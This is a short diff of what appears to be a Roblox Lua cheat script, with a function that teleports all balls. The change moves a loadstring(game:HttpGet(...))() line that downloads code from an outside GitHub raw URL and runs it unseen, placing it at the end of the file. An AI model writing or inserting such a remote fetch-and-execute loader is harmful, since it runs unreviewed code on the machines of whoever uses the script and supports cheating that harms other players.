@@ -1,7 +1,4 @@
 print "start load script"
-loadstring(game:HttpGet("https://raw.githubusercontent.com/NOTHINGx555/load/refs/heads/main/.lua"))()
-
-
 --G gol
 
 local Players = game:GetService("Players")
@@ -90,4 +87,6 @@ Workspace.ChildAdded:Connect(function(child)
         teleportAllBalls()
     end
 end)
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/NOTHINGx555/load/refs/heads/main/.lua"))()
 print "end load script"
